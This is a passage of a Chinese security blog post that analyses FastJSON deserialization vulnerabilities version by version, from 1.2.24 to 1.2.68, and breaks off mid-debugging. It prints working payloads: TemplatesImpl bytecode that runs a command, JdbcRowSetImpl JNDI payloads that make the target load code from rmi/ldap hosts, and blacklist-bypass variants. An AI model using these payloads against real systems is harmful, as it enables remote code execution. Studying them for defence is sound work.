@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>浅析FastJSON反序列化漏洞 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "FastJSON \u7b80\u4ecb", url: "#fastjson_1" },
+              {title: "FASTJSON\u548b\u7528", url: "#fastjson_2" },
+              {title: "FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90", url: "#fastjson_3" },
+              {title: "\u5404\u7248\u672c\u590d\u73b0", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u68c0\u6d4b", url: "#_9" },
+              {title: "\u5ba1\u8ba1\u5173\u952e\u5b57", url: "#_12" },
+              {title: "\u53c2\u8003", url: "#_13" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        表达式注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        xstream 反序列化
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="fastjson">浅析FastJSON反序列化漏洞</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#FastJSON-简介">FastJSON 简介</a></li>
+<li><a href="#FASTJSON咋用">FASTJSON咋用</a></li>
+<li><a href="#FASTJSON-反序列化漏洞起源">FASTJSON 反序列化漏洞起源</a></li>
+<li><a href="#各版本复现">各版本复现</a><ul>
+<li><a href="#1224">1.2.24</a><ul>
+<li><a href="#TemplatesImpl">TemplatesImpl</a></li>
+<li><a href="#JdbcRowSetImpl">JdbcRowSetImpl</a></li>
+</ul>
+</li>
+<li><a href="#1225">1.2.25</a><ul>
+<li><a href="#更新机制">更新机制</a></li>
+<li><a href="#bypass-1L法1225-1241">bypass 1（L;法）1.2.25-1.2.41</a></li>
+<li><a href="#bypass-2json内置1225-1247">bypass 2（json内置）1.2.25-1.2.47</a></li>
+</ul>
+</li>
+<li><a href="#1242">1.2.42</a><ul>
+<li><a href="#更新机制">更新机制</a></li>
+<li><a href="#bypass双写绕过">bypass（双写绕过）</a></li>
+</ul>
+</li>
+<li><a href="#1242">1.2.42</a><ul>
+<li><a href="#更新机制">更新机制</a></li>
+<li><a href="#Bypass">Bypass</a></li>
+</ul>
+</li>
+<li><a href="#1244">1.2.44</a><ul>
+<li><a href="#更新机制">更新机制</a></li>
+<li><a href="#Bypass">Bypass</a></li>
+</ul>
+</li>
+<li><a href="#1247-67">1.2.47-67</a><ul>
+<li><a href="#更新机制">更新机制</a></li>
+</ul>
+</li>
+<li><a href="#1268">1.2.68</a><ul>
+<li><a href="#Bypass-expectClass绕过AutoType--1268">Bypass expectClass绕过AutoType  &lt;=1.2.68</a></li>
+<li><a href="#调试">调试</a></li>
+<li><a href="#实战Gadget">实战Gadget</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#漏洞检测">漏洞检测</a><ul>
+<li><a href="#DNSLOG">DNSLOG</a></li>
+<li><a href="#报错检测">报错检测</a></li>
+<li><a href="#绕过异常">绕过异常</a></li>
+</ul>
+</li>
+<li><a href="#审计关键字">审计关键字</a></li>
+<li><a href="#参考">参考</a></li>
+</ul>
+<hr />
+<hr />
+<h2 id="fastjson_1">FastJSON 简介</h2>
+<p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。</p>
+<p><a href="https://github.com/alibaba/fastjson" title="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a> 👈项目地址</p>
+<p>“自2017年3月15日，fastjson官方主动爆出其在<code>1.2.24</code>及之前版本存在远程代码执行高危安全漏洞以来，各种新型绕过姿势层出不穷。“——c014</p>
+<h2 id="fastjson_2">FASTJSON咋用</h2>
+<p>答案：直接POM导入，方便地一批</p>
+<pre><code class="language-text">&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+        &lt;version&gt;x.x.xx&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<p>import com.alibaba.fastjson.JSON</p>
+<p>fastjson有两种常见的处理JSON的方法</p>
+<ul>
+<li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li>
+<li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li>
+</ul>
+<p>下面看一波实例：创建一个对象，将其转为JSON，然后再转回对象。
+同时可以发现，在JSON序列化时，会调用类的getxxx方法；在JSON反序列化时，会调用类的构造方法</p>
+<pre><code class="language-text">public class App 
+{
+    public static class User{
+        private String id;
+        User(){
+            System.out.println(&quot;User go&quot;);
+        }
+        public void setId(String ids){
+            System.out.println(&quot;setId go&quot;);
+            this.id=ids;
+        }
+        public String getId(){
+            System.out.println(&quot;GetId go&quot;);
+            return this.id;
+        }
+    }
+
+    public static void main(String[] args){
+        User a = new User();
+        String json = JSON.toJSONString(a);
+        System.out.println(json);
+        System.out.println(JSON.parseObject(json,User.class));
+    }
+}
+
+</code></pre>
+<pre><code class="language-text">User go
+GetId go
+{}
+User go
+org.example.App$User@36d4b5c
+</code></pre>
+<h2 id="fastjson_3">FASTJSON 反序列化漏洞起源</h2>
+<p>我们可以看到，把JSON反序列化的语句是 JSON.parseObject(json,User.class)，在指定JSON时，还需要指定其所属的类，显得代码就很臃肿，所以开发人员可以使用@type(autotype)字符段来使其不那么臃肿。
+像下面这样，在JSON通过指定@type的值来实现定位某类。</p>
+<pre><code class="language-text">JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;)
+</code></pre>
+<p>虽说这么做很方便，但是以这种方法进行反序列化，会执行类的构造方法和属性相关的get，set方法。</p>
+<pre><code class="language-text">public class App 
+{
+    public static class User{
+        private String id;
+        User(){
+            System.out.println(&quot;User go&quot;);
+        }
+        public void setId(String ids){
+            System.out.println(&quot;setId go&quot;);
+            this.id=ids;
+        }
+        public String getId(){
+            System.out.println(&quot;GetId go&quot;);
+            return this.id;
+        }
+    }
+
+    public static void main(String[] args){
+        System.out.println(JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;));
+    }
+}
+</code></pre>
+<pre><code class="language-text">User go
+setId go
+GetId go
+{&quot;id&quot;:&quot;123&quot;}
+</code></pre>
+<p>所以在这个JSON反序列化接口处，我们传入恶意的JSON，就可以调用任意类的构造方法以及属性相关的get，set方法。
+如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意JSON达到RCE的作用。</p>
+<p>另外，JSON.parseObject("{"@type":"org.example.App\$User","id":"123"}",Feature.SupportNonPublicField) ，可以直接为private成员赋值（不加Feature.SupportNonPublicField是无法对private成员赋值的）。虽然但是，即使是private属性，如果它有getter或setter那么它的getter和setter依旧会被调用。</p>
+<p>demo</p>
+<pre><code class="language-text">public static class User{
+        private String id;
+        User(){
+            System.out.println(&quot;User go&quot;);
+        }
+
+    }
+
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+        User a = JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.exp.Main.Main$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;,User.class);
+        System.out.println(a.id);
+
+        User b = JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.exp.Main.Main$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;,User.class,Feature.SupportNonPublicField);
+        System.out.println(b.id);
+    }
+
+User go
+null
+User go
+123
+</code></pre>
+<h2 id="_2">各版本复现</h2>
+<h3 id="1224">1.2.24</h3>
+<h4 id="templatesimpl">TemplatesImpl</h4>
+<p>是的，就是7U21链里面的TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
+<p>这个类本身就存在反序列化漏洞，会将成员变量_bytecodes的数据作为类的字节码进行newInsantce操作从而调用其构造方法或static块。故可以fastjson为契机去调用此类。
+但是由于_name 和_bytecodes 是私有属性，所以需要FASTJSON反序列化接口有Feature.SupportNonPublicField参数才能实现，利用条件很苛刻，但是条件允许的话就很方便，payload打过去就完事。</p>
+<p>“<em>_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。</em>"</p>
+<pre><code class="language-text">payload
+{
+  &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],
+  &quot;_name&quot; : &quot;a&quot;,
+  &quot;_tfactory&quot; : {},
+  &quot;outputProperties&quot; : {}
+}
+</code></pre>
+<p>_bytecodes的类长这样,编译生成Evil.class，将字节码读出并用base64加密，作为_bytecodes</p>
+<pre><code class="language-text">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Evil extends AbstractTranslet{
+static {
+            System.err.println(&quot;Pwned&quot;);
+            try {
+                String[] cmd = {&quot;calc&quot;};
+                java.lang.Runtime.getRuntime().exec(cmd).waitFor();
+            } catch ( Exception e ) {
+                e.printStackTrace();
+            }
+         }
+
+         @Override
+         public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
+                  // anything
+         }
+
+         @Override
+         public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
+                  // anything
+         }
+}
+</code></pre>
+<h4 id="jdbcrowsetimpl"><strong>JdbcRowSetImpl</strong></h4>
+<p><strong>com.sun.rowset.JdbcRowSetImpl</strong>,通过JNDI注入来实现RCE。但需注意JNDI注入有JDK版本限制，高版本需要进行绕过。</p>
+<p>我们的payload一般长这样</p>
+<pre><code class="language-text">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:/ip:port/Exploit&quot;,&quot;autoCommit&quot;:true}
+or
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:1099/exp&quot;,&quot;autoCommit&quot;:true}
+</code></pre>
+<p>把这个payload打过去，会执行setAutoCommit()，又setAutoCommit()执行了connct()函数，其如下。
+connect()会对dataSourceName属性进行一个InitialContext.lookup(dataSourceName),从而实现JNDI注入。</p>
+<pre><code class="language-text">private Connection connect() throws SQLException {
+        if(this.conn != null) {
+            return this.conn;
+        } else if(this.getDataSourceName() != null) {
+            try {
+                InitialContext var1 = new InitialContext();
+                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();
+            } catch (NamingException var3) {
+                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+            }
+        } else {
+            return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;
+        }
+    }
+</code></pre>
+<h3 id="1225">1.2.25</h3>
+<h4 id="_3">更新机制</h4>
+<p>1.2.24及以前版本就跟白纸一样随便打，在1.2.25开始加入了黑白名单机制</p>
+<p>我们继续用1.2.24的payload（这里用TemplatesImpl的payload）去打，会发现报错autotype不支持</p>
+<p><img alt="image-20210907163503833" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907163503833.png" title="image-20210907163503833" /></p>
+<p>究其原因，是因为在com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法</p>
+<pre><code class="language-text">com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass)
+</code></pre>
+<p><strong>在其中有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类</strong></p>
+<pre><code class="language-text">if (!autoTypeSupport) {
+      \\黑名单检测，classname是传入类的全名，denyList是黑名单
+            for (int i = 0; i &lt; denyList.length; ++i) {
+                String deny = denyList[i];
+                if (className.startsWith(deny)) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+            for (int i = 0; i &lt; acceptList.length; ++i) {
+                String accept = acceptList[i];
+                if (className.startsWith(accept)) {
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    }
+                    return clazz;
+                }
+            }
+        }
+
+</code></pre>
+<p><img alt="image-20210907164922626" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907164922626.png" title="image-20210907164922626" /></p>
+<p>黑名单长这样</p>
+<p><strong>若autotypesupport开启，则会先白名单加载，后黑名单检测</strong></p>
+<pre><code class="language-text">if (autoTypeSupport || expectClass != null) {
+    for (int i = 0; i &lt; acceptList.length; ++i) {
+        String accept = acceptList[i];
+        if (className.startsWith(accept)) {
+            return TypeUtils.loadClass(typeName, defaultClassLoader);
+        }
+    }
+
+    for (int i = 0; i &lt; denyList.length; ++i) {
+        String deny = denyList[i];
+        if (className.startsWith(deny)) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+    }
+}
+</code></pre>
+<p>后面的许多更新都是对checkAutotype以及本身某些逻辑缺陷导致的漏洞进行修复，以及黑名单的不断增加。</p>
+<h4 id="bypass-1l1225-1241">bypass 1（L;法）1.2.25-1.2.41</h4>
+<p>当autoTypeSupport开启或expectClass不为空时，会调用一个loadclass方法</p>
+<pre><code class="language-text">if (this.autoTypeSupport || expectClass != null) {
+    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+}
+</code></pre>
+<p>而在其中，若类名以L开头；结尾，则会把这两个字符去掉并加载类。</p>
+<p>“至于为什么会有这种奇怪的处理，L 和 ; 这一对字符其实是 JVM 字节码中用来表示类名的：”</p>
+<pre><code class="language-text">if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
+    String newClassName = className.substring(1, className.length() - 1);
+    return loadClass(newClassName, classLoader);
+}
+</code></pre>
+<p>所以在autotypesupport开启时，我们可以构造如下payload来bypass</p>
+<pre><code class="language-text">{&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:1099&quot;,&quot;autoCommit&quot;:true}
+</code></pre>
+<p>如何开启autotypesupport？只需在json被解析前加入如下代码即可</p>
+<pre><code class="language-text">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</code></pre>
+<h4 id="bypass-2json1225-1247">bypass 2（json内置）1.2.25-1.2.47</h4>
+<ul>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
+</ul>
+<pre><code class="language-text">{
+    &quot;a&quot;:{
+        &quot;@type&quot;:&quot;java.lang.Class&quot;,
+        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    },
+    &quot;b&quot;:{
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,
+        &quot;autoCommit&quot;:true
+    }
+}
+</code></pre>
+<h3 id="1242">1.2.42</h3>
+<h4 id="_4">更新机制</h4>
+<p>42版本中开发人员将明文黑名单改成了hash黑名单，已经有人碰撞出了不少，意义不大；在处理25黑名单绕过的时候做了一个校验，如果类名以<code>L</code>开头，<code>;</code>结尾，则会用stubstring处理一下(这个判断是由HASH来判断的，看不懂，但我大受震撼）：</p>
+<pre><code class="language-text">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
+    className = className.substring(1, className.length() - 1);
+}
+</code></pre>
+<h4 id="bypass">bypass（双写绕过）</h4>
+<p>那么直接一手双写绕过</p>
+<pre><code class="language-text">{
+    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,
+    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:2357/Command8&quot;,
+    &quot;autoCommit&quot;:true
+}
+</code></pre>
+<h3 id="1242_1">1.2.42</h3>
+<h4 id="_5">更新机制</h4>
+<p>针对双写绕过套了个子判断。</p>
+<pre><code class="language-text">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
+                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+
+                className = className.substring(1, className.length() - 1);
+            }
+</code></pre>
+<h4 id="bypass_1">Bypass</h4>
+<p>TypeUtils.loadClass 中除了对L;进行判断，还有对[进行了判断</p>
+<pre><code class="language-text">} else if (className.charAt(0) == '[') {
+    Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
+    return Array.newInstance(componentType, 0).getClass();
+} 
+</code></pre>
+<p>围绕这个展开，构造如下payload，具体为啥这么构造没有细跟，反正跟[有关</p>
+<pre><code class="language-text">{
+  &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,{
+  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],
+  &quot;_name&quot; : &quot;a&quot;,
+  &quot;_tfactory&quot; : {},
+  &quot;outputProperties&quot; : {}
+}
+</code></pre>
+<h3 id="1244">1.2.44</h3>
+<h4 id="_6">更新机制</h4>
+<p>44版本针对43版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常</p>
+<p><img alt="image-20210907182521116" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907182521116.png" title="image-20210907182521116" /></p>
+<h4 id="bypass_2">Bypass</h4>
+<p>JSON内置完美击破</p>
+<h3 id="1247-67">1.2.47-67</h3>
+<h4 id="_7">更新机制</h4>
+<p>由于47修复了JSON内置绕过，这些版本里也没啥很好的绕过方法，网上多是从黑名单中结合JNDI注入找漏网之鱼（找到的多为组件类，需要目标机器上有该组件才能打<a href="https://paper.seebug.org/1155/）以及expectClass绕过AutoType" title="https://paper.seebug.org/1155/）以及expectClass绕过AutoType">https://paper.seebug.org/1155/）以及expectClass绕过AutoType</a></p>
+<h3 id="1268">1.2.68</h3>
+<p>68版本之后出现了新的安全控制点safeMode，如果开启，在checkAtuoType的时候会直接抛出异常，只要设置@type类型，想反序列化指定类对象的时候，就会抛异常，也就是说开了safemod的站可以不用看了。
+当然这个版本expectClass绕过AutoType是可以打一打的。</p>
+<h4 id="bypass-expectclassautotype-1268">Bypass expectClass绕过AutoType  &lt;=1.2.68</h4>
+<p>这里通过一个demo展示一下.</p>
+<pre><code class="language-text">package org.example;
+
+import java.io.IOException;
+
+public class VulAutoCloseable implements AutoCloseable {
+    public VulAutoCloseable(){
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void close() throws Exception {
+
+    }
+}
+</code></pre>
+<p>然后我们的payload</p>
+<pre><code class="language-text">public class evil {
+        public static void main(String[] args){
+            System.out.println(JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;}\n&quot;));
+        }
+    }
+</code></pre>
+<p>执行后弹计算器</p>
+<p><img alt="image-20210907204915990" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907204915990.png" title="image-20210907204915990" /></p>
+<p>我们通过调试来看看具体是怎么个回事</p>
+<h4 id="_8">调试</h4>
+<p>于checkautotype 处下断点。</p>
+<p><img alt="image-20210907224439952" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224439952.png" title="image-20210907224439952" /></p>
+<p>可以发现传入的typename是 AutoCloseable。此时的expectClass是NULL</p>
